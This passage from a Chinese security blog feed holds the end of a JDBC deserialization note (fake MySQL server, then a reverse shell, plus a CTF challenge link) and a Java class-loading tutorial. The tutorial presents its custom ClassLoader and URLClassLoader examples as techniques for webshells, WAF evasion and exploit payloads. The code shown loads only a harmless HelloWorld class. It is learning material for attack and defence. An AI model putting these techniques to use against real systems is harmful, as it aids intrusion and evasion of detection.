punctuation">)</span></code></pre><p>思路：在服务器上触发某个方法，引起我们可控的jdbc连接，使其连上我们py脚本开启的fake_mysql_server,在这个服务端准备反序列化的数据</p><p>然后再反弹shell</p><p><strong>JDBC反序列化攻击流程</strong></p><img src="/img/12-26/4.png"><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目：[羊城杯 2020]a_piece_of_java </p><p>链接：<a href="https://www.nssctf.cn/problem/1418">https://www.nssctf.cn/problem/1418</a></p><p>题解：<a href="https://www.crisprx.top/archives/386#2020_a_piece_of_java">Java部分题解 学习篇 – Crispr –热爱技术和生活</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 反序列化漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java类加载机制与应用</title>
      <link href="/2023/12/10/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
      <url>/2023/12/10/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="java类加载机制与应用"><a href="#java类加载机制与应用" class="headerlink" title="java类加载机制与应用"></a>java类加载机制与应用</h1><p><em>学习类加载，有助于更好的进行攻击。如：</em></p><p><em>使用冰蝎和哥斯拉的webshell，利用字节码加载的方式绕过<strong>waf</strong>检测</em></p><p><em>在其他反<strong>序列化</strong>漏洞（比如fastjson反序列化漏洞）中的利用链中使用</em></p><p>我的感受：</p><p>   开始学java时候学这些东西的时候，我确实搞得一脸懵。当学过一些java反序列化后。学到fastjson反序列化的时候，就是这里没搞好，也搞搞得懵逼了。但又回来学习这个类加载的时候，就感觉刚刚好</p><p>Java是一个依赖于<code>JVM</code>（Java虚拟机）实现的跨平台的开发语言。Java程序在运行前需要先编译成<code>class文件</code>，Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，<code>ClassLoader</code>会调用JVM的native方法（<code>defineClass0/1/2</code>）来定义一个<code>java.lang.Class</code>实例。</p><h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a><strong>ClassLoader</strong></h2><p>一切的Java类都必须经过JVM加载后才能运行，而<code>ClassLoader</code>的主要作用就是Java类文件的加载。在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader（引导类加载器）</code>、<code>Extension ClassLoader（扩展类加载器）</code>、<code>App ClassLoader（系统类加载器）</code>，<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code>。</p><p>值得注意的是某些时候我们获取一个类的类加载器时候可能会返回一个<code>null</code>值，如:<code>java.io.File.class.getClassLoader()</code>将返回一个<code>null</code>对象，因为<code>java.io.File</code>类在JVM初始化的时候会被<code>Bootstrap ClassLoader（引导类加载器）</code>加载（该类加载器实现于JVM层，采用C++编写），我们在尝试获取被<code>Bootstrap ClassLoader</code>类加载器所加载的类的<code>ClassLoader</code>时候都会返回<code>null</code>。</p><p><code>ClassLoader</code>类有如下核心方法：</p><ol><li><code>loadClass</code>（加载指定的Java类）</li><li><code>findClass</code>（查找指定的Java类）</li><li><code>findLoadedClass</code>（查找JVM已经加载过的类）</li><li><code>defineClass</code>（定义一个Java类）</li><li><code>resolveClass</code>（链接指定的Java类）</li></ol><p>其他加载类的方法：</p><p>反射加载forName(clazzName,init,classload)</p><p>后面两个是可选参数，分别表示是否进行类初始化，指定类加载器</p><h2 id="Java类动态加载方式"><a href="#Java类动态加载方式" class="headerlink" title="Java类动态加载方式"></a><strong>Java类动态加载方式</strong></h2><p>Java类加载方式分为<code>显式</code>和<code>隐式</code>,<code>显式</code>即我们通常使用<code>Java反射</code>或者<code>ClassLoader</code>来动态加载一个类对象，而<code>隐式</code>指的是<code>类名.方法名()</code>或<code>new</code>类实例。<code>显式</code>类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类。</p><p><strong>常用的类动态加载方式：</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 反射加载TestHelloWorld示例</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.anbai.sec.classloader.TestHelloWorld"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ClassLoader加载TestHelloWorld示例this.getClass().getClassLoader().loadClass("com.anbai.sec.classloader.TestHelloWorld");</span></code></pre><p>不同：</p><ul><li>反射加载类forName。是调用了defineClass。会触发静态代码块</li><li>使用类加载器加载用loadClass只是将类load进来，不会触发静态代码块</li></ul><h2 id="ClassLoader类加载流程"><a href="#ClassLoader类加载流程" class="headerlink" title="ClassLoader类加载流程"></a><strong>ClassLoader类加载流程</strong></h2><p>理解Java类加载机制并非易事，这里我们以一个Java的HelloWorld来学习<code>ClassLoader</code>。</p><p><code>ClassLoader</code>加载<code>com.anbai.sec.classloader.TestHelloWorld</code>类<code>loadClass</code>重要流程如下：</p><ol><li><code>ClassLoader</code>会调用<code>public Class&lt;?&gt; loadClass(String name)</code>方法加载<code>com.anbai.sec.classloader.TestHelloWorld</code>类。</li><li>调用<code>findLoadedClass</code>方法检查<code>TestHelloWorld</code>类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。</li><li>如果创建当前<code>ClassLoader</code>时传入了父类加载器（<code>new ClassLoader(父类加载器)</code>）就使用父类加载器加载<code>TestHelloWorld</code>类，否则使用JVM的<code>Bootstrap ClassLoader</code>加载。</li><li>如果上一步无法加载<code>TestHelloWorld</code>类，那么调用自身的<code>findClass</code>方法尝试加载<code>TestHelloWorld</code>类。</li><li>如果当前的<code>ClassLoader</code>没有重写了<code>findClass</code>方法，那么直接返回类加载失败异常。如果当前类重写了<code>findClass</code>方法并通过传入的<code>com.anbai.sec.classloader.TestHelloWorld</code>类名找到了对应的类字节码，那么应该调用<code>defineClass</code>方法去JVM中注册该类。</li><li>如果调用loadClass的时候传入的<code>resolve</code>参数为true，那么还需要调用<code>resolveClass</code>方法链接类，默认为false。</li><li>返回一个被JVM加载后的<code>java.lang.Class</code>类对象。</li></ol><h2 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a><strong>自定义ClassLoader</strong></h2><p><code>java.lang.ClassLoader</code>是所有的类加载器的父类，<code>java.lang.ClassLoader</code>有非常多的子类加载器，比如我们用于加载jar包的<code>java.net``.URLClassLoader</code>其本身通过继承<code>java.lang.ClassLoader</code>类，重写了<code>findClass</code>方法从而实现了加载目录class文件甚至是远程资源文件。</p><p>如果<code>com.anbai.sec.classloader.TestHelloWorld</code>类存在的情况下，我们可以使用如下代码即可实现调用<code>hello</code>方法并输出：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">TestHelloWorld</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestHelloWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> str <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>但是如果<code>com.anbai.sec.classloader.TestHelloWorld</code>根本就不存在于我们的<code>classpath</code>，那么我们可以使用自定义类加载器重写<code>findClass</code>方法，然后在调用<code>defineClass</code>方法的时候传入<code>TestHelloWorld</code>类的字节码的方式来向JVM中定义一个<code>TestHelloWorld</code>类，最后通过反射机制就可以调用<code>TestHelloWorld</code>类的<code>hello</code>方法了。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>anbai<span class="token punctuation">.</span>sec<span class="token punctuation">.</span>classloader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestClassLoader</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">{</span>    <span class="token comment">// TestHelloWorld类名</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> testClassName <span class="token operator">=</span> <span class="token string">"com.anbai.sec.classloader.TestHelloWorld"</span><span class="token punctuation">;</span>   <span class="token comment">// TestHelloWorld类字节码</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> testClassBytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>            <span class="token operator">-</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span>            <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span>            <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span>            <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span>            <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span>            <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span>            <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span>            <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span>            <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span>            <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Overridepublic</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> <span class="token function">findClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token comment">// 只处理TestHelloWorld类</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>testClassName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// 调用JVM的native方法定义TestHelloWorld类</span>            <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>testClassName<span class="token punctuation">,</span> testClassBytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> testClassBytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">findClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 创建自定义的类加载器</span>        <span class="token class-name">TestClassLoader</span> loader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment">// 使用自定义的类加载器加载TestHelloWorld类</span>            <span class="token class-name">Class</span> testClass <span class="token operator">=</span> loader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>testClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();</span>            <span class="token class-name">Object</span> testInstance <span class="token operator">=</span> testClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 反射获取hello方法</span>            <span class="token class-name">Method</span> method <span class="token operator">=</span> testInstance<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 反射调用hello方法,等价于 String str = t.hello();</span>            <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>testInstance<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象，比如本地命令执行漏洞调用自定义类字节码</p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a><strong>URLClassLoader</strong></h2><p><code>URLClassLoader</code>继承了<code>ClassLoader</code>，<code>URLClassLoader</code>提供了加载远程资源的能力，在写漏洞利用的<code>payload</code>或者<code>webshell</code>的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。</p><p>一般用来加载jar文件，加载本地的使用file协议，远程的http</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>anbai<span class="token punctuation">.</span>sec<span class="token punctuation">.</span>classloader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span 